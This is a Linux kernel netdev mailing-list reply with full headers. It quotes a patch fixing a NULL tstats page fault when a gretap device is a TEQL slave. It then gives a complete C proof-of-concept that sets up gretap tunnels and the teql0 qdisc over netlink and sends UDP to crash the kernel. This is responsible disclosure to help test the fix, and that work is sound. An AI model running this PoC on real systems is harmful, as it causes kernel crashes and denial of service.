Return-Path: <netdev+bounces-263590-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id q7LyAJ7Bp2l1jgAAu9opvQ
	(envelope-from <netdev+bounces-263590-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Wed, 04 Mar 2026 06:22:38 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 3A1381FAD7F
	for <lists+netdev@lfdr.de>; Wed, 04 Mar 2026 06:22:37 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 9D3A3301A380
	for <lists+netdev@lfdr.de>; Wed,  4 Mar 2026 05:22:35 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id E74293264F3;
	Wed,  4 Mar 2026 05:22:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Yz0klhkN"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dl1-f42.google.com (mail-dl1-f42.google.com [74.125.82.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1B11D1E515
	for <netdev@vger.kernel.org>; Wed,  4 Mar 2026 05:22:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1772601754; cv=none; b=spO9Rex2au9UuQD+rddIvdk2QToQSu9Y7mY6CyO/FHw4pDNjA8UgrHQwQbQxDBQB+V/2iwnESSWCfEKK3GlT3hLt+TPjWK3FlyKxNN/jglv1wBogw51qHknxOXHa3/J8jwaIwb4HQZqk/McK9TiWDL+/ivK8sp2ki8XvG7QzmeM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1772601754; c=relaxed/simple;
	bh=U4ZloGSCcwdvCZUYxiozlTQLm7RkhCTh2KXscT3xMiY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=NRlw+SoWoR7BoSUcPaMaiDImZ4+jSQe6qlWw/NMmcf1eHCv9LQ3AUrX7dCewrKDGWQV56+pB8e9Bhq0wNtFQi2+6Lihpwg3joEQF59PgZZRBzro1khiP/wtafR09GXMQxHAm0f1c8+IKLyIZo84y8gDi+a+BSO7mhp1xxSWdC6k=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Yz0klhkN; arc=none smtp.client-ip=74.125.82.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dl1-f42.google.com with SMTP id a92af1059eb24-1273349c56bso7832793c88.0
        for <netdev@vger.kernel.org>; Tue, 03 Mar 2026 21:22:32 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1772601752; x=1773206552; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=4tzRj8aRURPokZWuHDSR7JW4ZtJZUafGiSP067OLDp8=;
        b=Yz0klhkN55/f5Km/64Lx7eJ3wgHS/tH/gGN6e1oF59Nn5MLEyWwbeqdYCo3ympMxwV
         yFltI6Ozo/FeO4yPtPfz3smaPwKgMlosEI/mnb/DARmqd9mwqv0LiD/cXmUa6eFUl+JU
         tTmmcEdBBiE1+mnMO5jneuIgHzeYdpOdGKho4n79M0orDrp+ehXdKKsjeAy0o6t31HP+
         /+8Hwe20L5tPTK0Do/Pr4ZakRognaHXPRXIpy/cULIyuwLdfwtuZ/cr4DBv4AkWMlAk6
         WyjkhcYtGs96qp49dmQslj7kmmZnDA5HbyejNjgBs0v4W36VkxHGy3RXPbGHm57A3cT3
         LADQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1772601752; x=1773206552;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=4tzRj8aRURPokZWuHDSR7JW4ZtJZUafGiSP067OLDp8=;
        b=EX7hnWGHGIP8JwDy0+Ar/eiWgzgH1idFXn2XmlUh+O+mYo/vm361sOaFFgoHrjZrXE
         g92TZ07nQoMNYpTYytcQon7yiz6FcTXeLtOB/NNBV8JRuwAgiZFijzfN2kDfSK/yMp2O
         0GzlHOdYNkxy2+9yF2E6mdsdHdWV0DYRha59oWiziTs7v/7rs/cFBEPP76EwSjpYVn3r
         rTT6QZn7zQst4ct38WTJRTssR4mYZoJBd0MHWVEnRCumhY7alf+nOf6/g3apX+9E4sPF
         Q9wqCuiC3KlBggPhOMhj/7mcBYz5bACBxkX6bRYsESI2z/T+QIEWGVJx3a1ufC25SeZm
         GyMw==
X-Forwarded-Encrypted: i=1; AJvYcCWQzhRCWp7f2dKOQtkXtdwwYLASKSzvTKbZiMZBY0vrUn1i3B9hfXvK/TLG5imerQD8OLzxUos=@vger.kernel.org
X-Gm-Message-State: AOJu0Yw8wwYGfh14Frx+YvqfTUZKWSKO+QgtU6yzeatYx3i1erBAuHeW
	pJgVTVRoG8Vv+RjoRffNlTQTXETadMxV0DgruOobeu1IQGAImLBQ8+j+1mx9jnsBUg==
X-Gm-Gg: ATEYQzwMqa3SdD8fKbgdxz5Ic614wMJZEnmEa6r/Cnl9xthFvdmOqhnrf/uanvH3M4q
	gcW6jXLiuBGXSdhbDCaw34mfeAtkaPXIfv4fvuYuzmJIF3AsRPcbjBsO18/w7BX4GSCsYffgPjh
	QFmdmhyr6DKJPX5MuuTtMOvahW/sU07DY7e816fnxv+SCIT9buf5IUbRAK/oQckFuzSFnqYGYlA
	n8X80NKLkqk4XwtGjzj32q63UG8NZ218/uAatZ0Zv1vxgIzPjKgXYFvqsRJohB/7uBQlqfGvH7j
	T9PE1mzaXF2ngBbIbijfWW3M288wBaDsZpRRam/zzUpMHt/Z2dKlae1faOQaQEsdIEbITfZC4cF
	frQLejSAllwToCcsVZmjEX9H6Qbf9nIx+25MSFIOQr0c4X2EjnvUDFaISOwdfbVi5/TVVY089Qi
	gEH4ZAnbJj6hLfRyJ6IbqVTAdPz1uLmNbhHot6ebLS
X-Received: by 2002:a05:7022:f102:b0:127:5cda:ab0f with SMTP id a92af1059eb24-128b7073451mr376117c88.5.1772601752016;
        Tue, 03 Mar 2026 21:22:32 -0800 (PST)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-12789a32dabsm20795764c88.11.2026.03.03.21.22.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 03 Mar 2026 21:22:31 -0800 (PST)
Date: Tue, 3 Mar 2026 22:22:29 -0700
From: Xiang Mei <xmei5@asu.edu>
To: bestswngs@gmail.com
Cc: security@kernel.org, edumazet@google.com, davem@davemloft.net, 
	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH] net/sched: teql: fix NULL pointer dereference in
 iptunnel_xmit on TEQL slave xmit
Message-ID: <rqhnwmdeb5u7nl6urhkkhixeukhlkcpveec5fzrvfn35rx2c22@ozbglzayolmp>
References: <20260304044216.3517851-3-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260304044216.3517851-3-bestswngs@gmail.com>
X-Rspamd-Queue-Id: 3A1381FAD7F
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	MID_RHS_NOT_FQDN(0.50)[];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	FREEMAIL_TO(0.00)[gmail.com];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-263590-lists,netdev=lfdr.de];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[9];
	NEURAL_HAM(-0.00)[-0.998];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo,asu.edu:dkim,asu.edu:email]
X-Rspamd-Action: no action

On Wed, Mar 04, 2026 at 12:42:18PM +0800, bestswngs@gmail.com wrote:
> From: Weiming Shi <bestswngs@gmail.com>
> 
> teql_master_xmit() calls netdev_start_xmit(skb, slave) to transmit
> through slave devices, but does not update skb->dev to the slave device
> beforehand.
> 
> When a gretap tunnel is a TEQL slave, the transmit path reaches
> iptunnel_xmit() which saves dev = skb->dev (still pointing to teql0
> master) and later calls iptunnel_xmit_stats(dev, pkt_len). This
> function does:
> 
>     get_cpu_ptr(dev->tstats)
> 
> Since teql_master_setup() does not set dev->pcpu_stat_type to
> NETDEV_PCPU_STAT_TSTATS, the core network stack never allocates tstats
> for teql0, so dev->tstats is NULL. get_cpu_ptr(NULL) computes
> NULL + __per_cpu_offset[cpu], resulting in a page fault.
> 
>  BUG: unable to handle page fault for address: ffff8880e6659018
>  #PF: supervisor write access in kernel mode
>  #PF: error_code(0x0002) - not-present page
>  PGD 68bc067 P4D 68bc067 PUD 0
>  Oops: Oops: 0002 [#1] SMP KASAN PTI
>  RIP: 0010:iptunnel_xmit (./include/net/ip_tunnels.h:664 net/ipv4/ip_tunnel_core.c:89)
>  Call Trace:
>   <TASK>
>   ip_tunnel_xmit (net/ipv4/ip_tunnel.c:847)
>   __gre_xmit (net/ipv4/ip_gre.c:478)
>   gre_tap_xmit (net/ipv4/ip_gre.c:779)
>   teql_master_xmit (net/sched/sch_teql.c:319)
>   dev_hard_start_xmit (net/core/dev.c:3887)
>   sch_direct_xmit (net/sched/sch_generic.c:347)
>   __dev_queue_xmit (net/core/dev.c:4802)
>   neigh_direct_output (net/core/neighbour.c:1660)
>   ip_finish_output2 (net/ipv4/ip_output.c:237)
>   __ip_finish_output.part.0 (net/ipv4/ip_output.c:315)
>   ip_mc_output (net/ipv4/ip_output.c:369)
>   ip_send_skb (net/ipv4/ip_output.c:1508)
>   udp_send_skb (net/ipv4/udp.c:1195)
>   udp_sendmsg (net/ipv4/udp.c:1485)
>   inet_sendmsg (net/ipv4/af_inet.c:859)
>   __sys_sendto (net/socket.c:2206)
> 
> Fix this by setting skb->dev = slave before calling
> netdev_start_xmit(), so that tunnel xmit functions see the correct
> slave device with properly allocated tstats.
> 
> Fixes: 039f50629b7f ("ip_tunnel: Move stats update to iptunnel_xmit()")
> Reported-by: Xiang Mei <xmei5@asu.edu>
> Signed-off-by: Weiming Shi <bestswngs@gmail.com>
> ---
>  net/sched/sch_teql.c | 1 +
>  1 file changed, 1 insertion(+)
> 
> diff --git a/net/sched/sch_teql.c b/net/sched/sch_teql.c
> index 6e4bdaa876ed..783300d8b019 100644
> --- a/net/sched/sch_teql.c
> +++ b/net/sched/sch_teql.c
> @@ -315,6 +315,7 @@ static netdev_tx_t teql_master_xmit(struct sk_buff *skb, struct net_device *dev)
>  			if (__netif_tx_trylock(slave_txq)) {
>  				unsigned int length = qdisc_pkt_len(skb);
>  
> +				skb->dev = slave;
>  				if (!netif_xmit_frozen_or_stopped(slave_txq) &&
>  				    netdev_start_xmit(skb, slave, slave_txq, false) ==
>  				    NETDEV_TX_OK) {
> -- 
> 2.43.0
>

Here is a PoC for your ref and please test the poc on the kernel enabled
```
  CONFIG_NET_SCHED=y          # qdisc framework                                                                                                                                                                                                                                                      
  CONFIG_NET_SCH_TEQL=y       # the buggy TEQL qdisc
  CONFIG_NET_IPGRE_DEMUX=y    # GRE demux
  CONFIG_NET_IPGRE=y          # gretap tunnel
  CONFIG_NET_IP_TUNNEL=y      # ip tunnel core
```

```c
// PoC: TEQL iptunnel_xmit NULL tstats page fault
//
// Bug: When a gretap device is a TEQL slave and transmits a packet,
// iptunnel_xmit() reads skb->dev to update per-CPU tunnel stats.
// However, skb->dev still points to the teql0 master device (not
// the gretap slave), and teql0 does not allocate dev->tstats.
// This causes a NULL pointer dereference in iptunnel_xmit_stats().
//
// Root Cause:
//   teql_master_xmit() calls netdev_start_xmit(skb, slave, ...) to
//   send the skb through a gretap slave. However, it does NOT set
//   skb->dev = slave beforehand. Neither does netdev_start_xmit(),
//   gre_tap_xmit(), __gre_xmit(), nor ip_tunnel_xmit().
//
//   So when iptunnel_xmit() saves dev = skb->dev (line 57 of
//   ip_tunnel_core.c), dev is still teql0, not gretapN.
//
//   After ip_local_out(), iptunnel_xmit_stats(dev, pkt_len) calls:
//     get_cpu_ptr(dev->tstats)
//
//   teql0->tstats is NULL because teql_master_setup() does not set
//   dev->pcpu_stat_type = NETDEV_PCPU_STAT_TSTATS, so the core
//   network stack never allocates tstats for teql0.
//
//   get_cpu_ptr(NULL) computes: NULL + __per_cpu_offset[cpu]
//   = __per_cpu_offset[0] (the GS base), which may point to an
//   unmapped page (PUD=0), causing a page fault.
//
// Call trace:
//   sendto() [userspace]
//     udp_sendmsg
//       ip_send_skb -> ip_mc_output -> ip_finish_output2
//         neigh_direct_output -> __dev_queue_xmit(teql0)
//           sch_direct_xmit -> dev_hard_start_xmit
//             teql_master_xmit
//               netdev_start_xmit(skb, gretapN)    <-- skb->dev still = teql0
//                 gre_tap_xmit -> __gre_xmit
//                   ip_tunnel_xmit -> iptunnel_xmit
//                     dev = skb->dev = teql0        <-- teql0, NOT gretapN!
//                     ip_local_out(...)
//                     iptunnel_xmit_stats(dev, ...)
//                       get_cpu_ptr(dev->tstats)    <-- dev->tstats == NULL
//                       CRASH: page fault
//
// Topology:
//   teql0 (master, 10.1.1.1/24)
//   gretap1..7 (TEQL slaves, remotes 10.1.1.2..8, routed via teql0)
//   Static ARP entries on teql0 for 10.1.1.2..8
//
// Trigger: send multicast or unicast UDP through teql0

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_tunnel.h>
#include <linux/neighbour.h>
#include <linux/pkt_sched.h>
#include <arpa/inet.h>

extern unsigned int if_nametoindex(const char *__ifname);

#ifndef IFF_UP
#define IFF_UP 0x1
#endif

struct nlmsg {
    char *pos;
    int nesting;
    struct nlattr *nested[8];
    char buf[8192];
};

static void nl_init(struct nlmsg *nlmsg, int typ, int flags,
                    const void *data, int size)
{
    memset(nlmsg, 0, sizeof(*nlmsg));
    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
    hdr->nlmsg_type = typ;
    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    memcpy(hdr + 1, data, size);
    nlmsg->pos = (char *)(hdr + 1) + NLMSG_ALIGN(size);
}

static void nl_attr(struct nlmsg *nlmsg, int typ, const void *data, int size)
{
    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
    attr->nla_len = sizeof(*attr) + size;
    attr->nla_type = typ;
    if (size > 0) memcpy(attr + 1, data, size);
    nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void nl_nest(struct nlmsg *nlmsg, int typ)
{
    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
    attr->nla_type = typ;
    nlmsg->pos += sizeof(*attr);
    nlmsg->nested[nlmsg->nesting++] = attr;
}

static void nl_done(struct nlmsg *nlmsg)
{
    struct nlattr *attr = nlmsg->nested[--nlmsg->nesting];
    attr->nla_len = nlmsg->pos - (char *)attr;
}

static int nl_send(struct nlmsg *nlmsg, int sock)
{
    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
    hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
                       (struct sockaddr *)&addr, sizeof(addr));
    if (n != (ssize_t)hdr->nlmsg_len) return -1;
    n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
    if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr)))
        return -1;
    hdr = (struct nlmsghdr *)nlmsg->buf;
    if (hdr->nlmsg_type == NLMSG_ERROR) {
        int err = -((struct nlmsgerr *)(hdr + 1))->error;
        if (err) { errno = err; return -err; }
    }
    return 0;
}

static int dev_updown(int sock, struct nlmsg *nlmsg, const char *name, int up)
{
    struct ifinfomsg hdr = {};
    hdr.ifi_index = if_nametoindex(name);
    if (!hdr.ifi_index) return -1;
    hdr.ifi_flags = up ? IFF_UP : 0;
    hdr.ifi_change = IFF_UP;
    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
    int ret = nl_send(nlmsg, sock);
    printf("  %s %s: %s\n", up ? "up" : "down", name, ret ? strerror(errno) : "ok");
    return ret;
}

static int add_addr4(int sock, struct nlmsg *nlmsg, const char *dev,
                     const char *addr_str, int prefix)
{
    struct ifaddrmsg hdr = {};
    hdr.ifa_family = AF_INET;
    hdr.ifa_prefixlen = prefix;
    hdr.ifa_index = if_nametoindex(dev);
    struct in_addr addr;
    inet_pton(AF_INET, addr_str, &addr);
    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
    int ret = nl_send(nlmsg, sock);
    printf("  addr %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
    return ret;
}

static int add_neigh4(int sock, struct nlmsg *nlmsg, const char *dev,
                      const char *addr_str, const unsigned char *mac)
{
    struct ndmsg hdr = {};
    hdr.ndm_family = AF_INET;
    hdr.ndm_ifindex = if_nametoindex(dev);
    hdr.ndm_state = 0x80; /* NUD_PERMANENT */
    nl_init(nlmsg, RTM_NEWNEIGH, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    struct in_addr addr;
    inet_pton(AF_INET, addr_str, &addr);
    nl_attr(nlmsg, NDA_DST, &addr, sizeof(addr));
    nl_attr(nlmsg, NDA_LLADDR, mac, 6);
    int ret = nl_send(nlmsg, sock);
    printf("  neigh %s %s: %s\n", dev, addr_str, ret ? strerror(errno) : "ok");
    return ret;
}

static int create_gretap(int sock, struct nlmsg *nlmsg, const char *name,
                         uint32_t remote)
{
    struct ifinfomsg hdr = {};
    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
    nl_nest(nlmsg, IFLA_LINKINFO);
    nl_attr(nlmsg, IFLA_INFO_KIND, "gretap", 6);
    nl_nest(nlmsg, IFLA_INFO_DATA);
    nl_attr(nlmsg, IFLA_GRE_REMOTE, &remote, sizeof(remote));
    nl_done(nlmsg);
    nl_done(nlmsg);
    int ret = nl_send(nlmsg, sock);
    printf("  create gretap %s: %s\n", name, ret ? strerror(errno) : "ok");
    return ret;
}

static int replace_qdisc_teql(int sock, struct nlmsg *nlmsg, const char *dev)
{
    struct tcmsg hdr = {};
    hdr.tcm_family = AF_UNSPEC;
    hdr.tcm_ifindex = if_nametoindex(dev);
    hdr.tcm_handle = 0;
    hdr.tcm_parent = 0xFFFFFFFF; /* TC_H_ROOT */

    nl_init(nlmsg, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
    nl_attr(nlmsg, TCA_KIND, "teql0", 6);
    int ret = nl_send(nlmsg, sock);
    printf("  qdisc %s -> teql0: %s\n", dev, ret ? strerror(errno) : "ok");
    return ret;
}

int main(void)
{
    printf("[*] PoC: TEQL iptunnel_xmit NULL tstats crash\n");
    printf("[*] Bug: teql_master_xmit doesn't set skb->dev to slave device\n");
    printf("[*]      before calling netdev_start_xmit(skb, slave).\n");
    printf("[*]      So iptunnel_xmit() reads skb->dev = teql0 (master),\n");
    printf("[*]      but teql0->tstats is NULL -> page fault.\n\n");

    int sock = socket(AF_NETLINK, SOCK_RAW, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct nlmsg nlmsg;
    struct in_addr remote;
    unsigned char fake_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};

    printf("[*] Step 1: Bring up loopback\n");
    dev_updown(sock, &nlmsg, "lo", 1);

    printf("[*] Step 2: Create gretap tunnels\n");
    int num = 3;
    char gname[16], rstr[32];
    for (int i = 0; i < num; i++) {
        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
        snprintf(rstr, sizeof(rstr), "10.1.1.%d", i + 2);
        inet_pton(AF_INET, rstr, &remote);
        create_gretap(sock, &nlmsg, gname, remote.s_addr);
    }

    printf("[*] Step 3: Bring up gretaps and attach teql0 qdisc\n");
    for (int i = 0; i < num; i++) {
        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
        dev_updown(sock, &nlmsg, gname, 1);
        replace_qdisc_teql(sock, &nlmsg, gname);
    }

    printf("[*] Step 4: Configure teql0\n");
    dev_updown(sock, &nlmsg, "teql0", 1);
    add_addr4(sock, &nlmsg, "teql0", "10.1.1.1", 24);

    printf("[*] Step 5: Add ARP entries\n");
    for (int i = 0; i < num; i++) {
        snprintf(rstr, sizeof(rstr), "10.1.1.%d", i + 2);
        fake_mac[5] = 0x55 + i;
        add_neigh4(sock, &nlmsg, "teql0", rstr, fake_mac);
    }

    printf("[*] Step 6: Send multicast through teql0 to trigger crash\n");
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd >= 0) {
        setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */, "teql0", 6);
        int ttl = 1;
        setsockopt(fd, IPPROTO_IP, 33 /* IP_MULTICAST_TTL */, &ttl, sizeof(ttl));

        struct sockaddr_in dst = {};
        dst.sin_family = AF_INET;
        dst.sin_port = htons(9999);
        inet_pton(AF_INET, "224.0.0.1", &dst.sin_addr);

        char buf[64] = "trigger";
        for (int i = 0; i < 5; i++) {
            ssize_t n = sendto(fd, buf, sizeof(buf), 0,
                               (struct sockaddr *)&dst, sizeof(dst));
            printf("  send #%d: %zd (%s)\n", i, n, n < 0 ? strerror(errno) : "ok");
            usleep(100000);
        }
        close(fd);
    }

    printf("[*] Also try unicast\n");
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd >= 0) {
        struct sockaddr_in dst = {};
        dst.sin_family = AF_INET;
        dst.sin_port = htons(9999);
        inet_pton(AF_INET, "10.1.1.2", &dst.sin_addr);

        char buf[64] = "trigger";
        for (int i = 0; i < 5; i++) {
            ssize_t n = sendto(fd, buf, sizeof(buf), 0,
                               (struct sockaddr *)&dst, sizeof(dst));
            printf("  send #%d: %zd (%s)\n", i, n, n < 0 ? strerror(errno) : "ok");
            usleep(100000);
        }
        close(fd);
    }

    printf("[*] Done. Check dmesg for BUG/Oops.\n");
    sleep(3);
    close(sock);
    return 0;
}
```

Thanks,
Xiang

